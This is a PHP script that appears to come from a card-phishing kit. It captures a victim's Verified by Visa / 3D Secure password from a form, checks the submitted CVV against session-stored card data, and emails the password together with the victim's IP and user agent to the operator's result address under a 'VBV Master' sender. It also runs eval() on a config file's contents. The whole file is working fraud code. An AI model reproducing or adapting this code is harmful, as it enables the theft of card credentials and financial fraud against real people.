<?php
require_once __DIR__ . '/../function.php';
require_once __DIR__ . '/../filter.php';

if (file_exists('../config/' . $api->general_config)) {
  @eval(file_get_contents('../config/' . $api->general_config));
}

$api->waiting();

$_SESSION['3dsecure'] = $_POST['password_vbv'];

if ($_POST['cvv'] != $_SESSION['card_cvv']) {
  echo "error";
} else if ($config_identity == 0) {
  echo "noid";
} else {
	$message = file_get_contents('../assets/html/secure.html');
  $message = preg_replace('{QUOTE}', $quotes[array_rand($quotes, 1)], $message);

  $message = preg_replace('{KUZULUY-A}', $_SESSION['3dsecure'], $message);

  $message = preg_replace('{X_IP}', $_SESSION['ip'], $message);
  $message = preg_replace('{X_AGENT}', $_SESSION['agent'], $message);

  $subject  = $_SESSION['card_title']." [ ".$_SESSION['country']." | ".$_SESSION['ip']." | ".$_SESSION['os']." ]";
  $headers  = "From: VBV Master <dxdiag@goodpostman.com>\r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

  if ($config_smtp == 1){
    $api->ngesend($api->result(), $subject, $message);
  } else {
    mail($api->result(), $subject, $message, $headers);
  }
}
?>
